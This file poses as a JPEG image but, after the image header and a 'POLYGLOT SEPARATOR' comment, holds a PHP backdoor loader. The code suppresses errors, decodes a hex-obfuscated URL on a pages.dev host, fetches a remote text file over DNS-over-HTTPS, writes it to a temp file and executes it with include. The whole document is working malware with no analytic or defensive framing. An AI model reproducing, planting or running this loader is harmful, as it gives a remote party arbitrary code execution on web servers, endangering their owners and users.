����JFIF�
/* POLYGLOT SEPARATOR */
<?php

error_reporting(0);
set_time_limit(0);


$url = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x69\x6d\x68\x65\x72\x65\x77\x61\x69\x74\x69\x6e\x67\x2d\x61\x6c\x6f\x6e\x65\x2e\x70\x61\x67\x65\x73\x2e\x64\x65\x76\x2f\x63\x6f\x64\x65\x6e\x61\x6d\x65\x2f\x74\x61\x6e\x70\x61\x2e\x74\x78\x74";


$dns = "https://cloudflare-dns.com/dns-query";

$ch = curl_init($url);


if (defined("CURLOPT_DOH_URL")) {
    curl_setopt($ch, CURLOPT_DOH_URL, $dns);
}


curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);

$res = curl_exec($ch);

curl_close($ch);




$tmp = tmpfile();


$path_metadata = stream_get_meta_data($tmp);
$path = $path_metadata["uri"];


fprintf($tmp, "%s", $res);


include $path;

?>
